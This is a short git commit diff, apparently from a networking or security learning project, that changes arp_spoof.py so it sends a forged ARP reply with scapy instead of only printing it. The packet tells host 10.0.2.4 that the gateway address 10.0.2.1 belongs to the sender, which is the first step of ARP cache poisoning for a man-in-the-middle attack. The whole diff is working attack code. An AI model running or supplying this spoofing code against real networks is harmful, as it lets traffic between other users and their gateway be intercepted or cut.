d8b6a6aaaa9b1312d1d2ab760985c6c9f0365e7e
nicbatten <48190415+nicbatten@users.noreply.github.com>
2019-08-10 13:25:30 -0400

    Sending the packet

--- arp_spoof.py
+++ arp_spoof.py
@@ -4,5 +4,6 @@ import scapy.all as scapy
 
 #op=2 is a arp reqponse and not a request
 packet = scapy.ARP(op=2, pdst="10.0.2.4", hwdst="08:00:27:33:26:01", psrc="10.0.2.1")
-print(packet.show())
-print(packet.summary())
+#print(packet.show())
+#print(packet.summary())
+scapy.send(packet)
